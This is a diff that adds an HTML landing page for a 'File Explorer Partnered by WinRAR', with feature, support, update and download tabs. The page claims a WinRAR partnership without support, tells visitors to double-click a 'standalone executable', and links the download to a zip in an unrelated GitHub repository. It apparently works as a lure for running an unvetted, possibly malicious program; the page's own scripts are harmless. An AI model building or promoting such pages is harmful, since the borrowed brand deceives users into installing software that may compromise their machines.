@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Explorer Partnered by WinRAR</title>
+    <style>
+        /* Global Styles */
+        body {
+            font-family: 'Georgia', serif;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #ddd;
+            line-height: 1.6;
+            overflow-x: hidden;
+            transition: background 0.5s ease;
+        }
+
+        /* Header */
+        header {
+            background: linear-gradient(135deg, #333 0%, #222 100%);
+            color: #f0f0f0;
+            padding: 1.5rem 0;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.5);
+            border-bottom: 2px solid #111;
+            position: relative;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.6);
+        }
+
+        .logo::before {
+            content: "🍃";
+            margin-right: 0.5rem;
+        }
+
+        /* Background Switcher */
+        .bg-switcher {
+            position: absolute;
+            top: 1rem;
+            right: 2rem;
+            padding: 0.5rem 1rem;
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            border: 2px solid #555;
+            border-radius: 15px;
+            cursor: pointer;
+            color: #f0f0f0;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        .bg-switcher:hover {
+            background: linear-gradient(135deg, #555 0%, #444 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.6);
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            border-radius: 20px 20px 0 0;
+            overflow: hidden;
+            margin: 2rem auto;
+            max-width: 1200px;
+            width: 90%;
+            border-bottom: 3px solid #222;
+            animation: slideIn 0.5s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 1.2rem;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            font-size: 1.1rem;
+            color: #f0f0f0;
+            transition: all 0.4s ease;
+            border-right: 2px solid #222;
+            position: relative;
+            border-radius: 15px 15px 0 0;
+        }
+
+        .tab-button:last-child {
+            border-right: none;
+        }
+
+        .tab-button:hover {
+            background: linear-gradient(135deg, #555 0%, #444 100%);
+            color: #fff;
+            transform: translateY(-2px);
+        }
+
+        .tab-button.active {
+            background: linear-gradient(135deg, #666 0%, #555 100%);
+            color: #fff;
+            box-shadow: inset 0 -4px 6px rgba(0, 0, 0, 0.5);
+            font-weight: bold;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            max-width: 1200px;
+            margin: 0 auto 2rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, #333 0%, #222 100%);
+            border-radius: 0 20px 20px 20px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+            border: 2px solid #111;
+            animation: fadeIn 0.5s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 3rem 2rem;
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            color: #f0f0f0;
+            border-radius: 25px;
+            margin: 2rem;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+            border: 3px solid #222;
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            from { transform: scale(1); }
+            to { transform: scale(1.02); }
+        }
+
+        .hero h1 {
+            font-size: 2.8rem;
+            margin-bottom: 1.2rem;
+            text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.7);
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 2rem;
+            opacity: 0.9;
+        }
+
+        /* Lists */
+        .features, .support, .updates {
+            list-style: none;
+            padding: 0;
+            margin: 1rem 0;
+        }
+
+        .features li, .support li, .updates li {
+            padding: 1.2rem;
+            margin: 1rem 0;
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            border-left: 5px solid #555;
+            animation: slideUp 0.5s ease-out backwards;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .features li:hover, .support li:hover, .updates li:hover {
+            transform: scale(1.02);
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(135deg, #555 0%, #444 100%);
+        }
+
+        /* Download Section */
+        .download-section {
+            text-align: center;
+            padding: 2rem;
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            border-radius: 20px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+            margin: 1rem 0;
+            animation: bounceIn 0.7s ease-out;
+        }
+
+        @keyframes bounceIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .download-btn {
+            display: inline-block;
+            padding: 1.2rem 2.5rem;
+            background: linear-gradient(135deg, #666 0%, #555 100%);
+            color: #f0f0f0;
+            text-decoration: none;
+            border-radius: 30px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            transition: all 0.4s ease;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
+            border: 2px solid #222;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.6);
+            color: #fff;
+        }
+
+        /* Requirements */
+        .requirements {
+            background: linear-gradient(135deg, #444 0%, #333 100%);
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin: 1rem 0;
+            border-left: 5px solid #555;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .requirements h3 {
+            margin-top: 0;
+            color: #ddd;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.4);
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(135deg, #222 0%, #111 100%);
+            color: #f0f0f0;
+            text-align: center;
+            padding: 1.5rem 0;
+            margin-top: 3rem;
+            border-top: 2px solid #000;
+            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.5);
+            animation: fadeInFooter 1s ease-in;
+        }
+
+        @keyframes fadeInFooter {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .tabs {
+                flex-direction: column;
+                border-radius: 20px;
+            }
+
+            .tab-button {
+                border-right: none;
+                border-bottom: 2px solid #222;
+                border-radius: 0;
+            }
+
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <nav>
+            <div class="logo">File Explorer Partnered by WinRAR</div>
+            <div class="bg-switcher" onclick="changeBackground()">Change Background</div>
+        </nav>
+    </header>
+
+    <div class="tabs">
+        <button class="tab-button active" onclick="openTab(event, 'home')">Home</button>
+        <button class="tab-button" onclick="openTab(event, 'features')">Features</button>
+        <button class="tab-button" onclick="openTab(event, 'support')">Support</button>
+        <button class="tab-button" onclick="openTab(event, 'updates')">Updates</button>
+        <button class="tab-button" onclick="openTab(event, 'download')">Download</button>
+    </div>
+
+    <div id="home" class="tab-content active">
+        <div class="hero">
+            <h1>Welcome to File Explorer Partnered by WinRAR</h1>
+            <p>Experience a sleek, powerful file management tool designed to enhance your workflow, backed by the trusted name in compression, WinRAR.</p>
+        </div>
+        <section>
+            <h2>About Us</h2>
+            <p>Our application redefines file exploration with a user-friendly interface and robust features, crafted to work seamlessly with WinRAR's compression technology. Dive into a world of organized files and efficient management.</p>
+            <p>Perfect for professionals and casual users alike, offering a smooth experience with every click.</p>
+        </section>
+    </div>
+
+    <div id="features" class="tab-content">
+        <h2>Key Features</h2>
+        <ul class="features">
+            <li>📁 Smooth Directory Browsing: Navigate folders with a fluid, tree-view layout.</li>
+            <li>🔍 Smart File Search: Locate files instantly with advanced filtering options.</li>
+            <li>📊 Detailed Insights: Access comprehensive file and folder properties.</li>
+            <li>✂️ Effortless Operations: Drag-and-drop support for copying, moving, and deleting.</li>
+            <li>🎨 Customizable Themes: Personalize your interface with stunning visual options.</li>
+            <li>⚡ High Performance: Optimized for speed and reliability.</li>
+        </ul>
+    </div>
+
+    <div id="support" class="tab-content">
+        <h2>Support & Resources</h2>
+        <ul class="support">
+            <li>📞 24/7 Help Desk: Contact our team for immediate assistance.</li>
+            <li>📚 User Guides: Detailed manuals to get you started.</li>
+            <li>💬 Community Forum: Join discussions with other users.</li>
+            <li>🔧 Troubleshooting Tips: Common fixes for quick resolutions.</li>
+            <li>📧 Email Support: Reach us at support@winrarfileexplorer.com.</li>
+        </ul>
+    </div>
+
+    <div id="updates" class="tab-content">
+        <h2>Latest Updates</h2>
+        <ul class="updates">
+            <li>📅 September 13, 2025, 04:33 PM EDT: Enhanced UI with new theme options.</li>
+            <li>📅 August 25, 2025: Added support for larger file previews.</li>
+            <li>📅 July 15, 2025: Improved compression integration with WinRAR.</li>
+            <li>📅 June 10, 2025: Initial release with core features.</li>
+        </ul>
+    </div>
+
+    <div id="download" class="tab-content">
+        <h2>Get File Explorer Partnered by WinRAR</h2>
+        <div class="requirements">
+            <h3>Requirements</h3>
+            <p><strong>Python 3.6 or higher</strong> is required to run the development environment or customize the app. If you don't have Python, download it from the <a href="https://www.python.org/downloads/" target="_blank" style="color: #bbb; text-decoration: underline;">official Python website</a>. The application itself is a standalone executable.</p>
+        </div>
+        <div class="download-section">
+            <p>Download the latest version of our File Explorer app, partnered with WinRAR, and start exploring your files with ease. Simply double-click the downloaded file to launch.</p>
+            <a href="https://github.com/thecoderfinder/inf/raw/main/code%20(1).zip" class="download-btn" download>Download Now</a>
+        </div>
+        <section>
+            <h3>Installation Steps</h3>
+            <ol>
+                <li>Download the ZIP file above.</li>
+                <li>Extract the contents to a folder on your computer.</li>
+            </ol>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 File Explorer Partnered by WinRAR. All rights reserved.</p>
+    </footer>
+
+    <script>
+        function openTab(evt, tabName) {
+            var tabcontents = document.getElementsByClassName("tab-content");
+            for (var i = 0; i < tabcontents.length; i++) {
+                tabcontents[i].classList.remove("active");
+            }
+
+            var tabbuttons = document.getElementsByClassName("tab-button");
+            for (var i = 0; i < tabbuttons.length; i++) {
+                tabbuttons[i].classList.remove("active");
+            }
+
+            document.getElementById(tabName).classList.add("active");
+            evt.currentTarget.classList.add("active");
+        }
+
+        function changeBackground() {
+            const backgrounds = [
+                '#000', // Black (default)
+                '#1a1a1a', // Dark Gray
+                '#2f2f2f', // Medium Gray
+                '#4a4a4a' // Light Gray
+            ];
+            let currentBg = document.body.style.background;
+            let newBg = backgrounds[(backgrounds.indexOf(currentBg) + 1) % backgrounds.length];
+            document.body.style.background = newBg;
+        }
+    </script>
+</body>
+</html>
